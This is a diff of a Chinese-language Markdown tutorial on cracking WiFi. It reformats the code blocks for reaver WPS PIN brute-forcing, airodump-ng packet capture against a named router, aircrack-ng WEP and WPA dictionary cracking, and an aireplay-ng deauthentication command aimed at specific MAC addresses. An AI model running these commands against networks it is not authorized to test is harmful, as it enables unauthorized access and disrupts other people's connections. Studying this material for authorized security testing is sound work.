@@ -12,20 +12,19 @@
 
 方式:
 
-```
-sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
-```
+	sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
+
 
 显示更多信息 
 
-```
-sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
-```
+
+	sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
+
 
 指定特定的pin码
-```
-sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n -p 40869200
-```
+
+	sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n -p 40869200
+
 # 查看
 
 当然，通过输入iwconfig查看也是可以滴。这个命令专用于查看无线网卡，不像ifconfig那样查看所有适配器。
@@ -51,9 +50,9 @@ mon0为之前已经载入并激活监听模式的无线网卡。如下图8所示
 # 监听
 
 既然我们看到了本次测试要攻击的目标，就是那个SSID名为TP-LINK的无线路由器，接下来输入命令如下：
-```
-airodump-ng --ivs -w longas -c 6 wlan0 
-```
+
+	airodump-ng --ivs -w longas -c 6 wlan0 
+
 参数解释：
 
 * `--ivs` 这里的设置是通过设置过滤，不再将所有无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小；
@@ -72,18 +71,20 @@ airodump-ng --ivs -w longas -c 6 wlan0
 
 
 图11
-airodump-ng -c 6  -w <文件名> --ivs mon0
+
+	airodump-ng -c 6  -w <文件名> --ivs mon0
+
 
 # 破解
 破解 web加密,需要iv2万左右
-```
-aircrack-ng  *.ivs 
-```
+
+	aircrack-ng  *.ivs 
+
 
 破解 wpa加密, 一个握手包+海量字典:
-```
-aircrack-ng  -w <字典文件> *.cap 
-```
+
+	aircrack-ng  -w <字典文件> *.cap 
+
 
 强制断开
 	aireplay-ng -0 1  -a 6C:E8:73:50:85:F0 -c 00:1B:77:BE:19:FC mon0
@@ -91,10 +92,10 @@ aircrack-ng  -w <字典文件> *.cap
 
 # 暴力wap的
 
-```
+```bash
 airodump-ng -c 6  -w [filename] mon0
 ```
 
-```
+```bash
 aircrack-ng  -w [字典] *.cap 
 ```
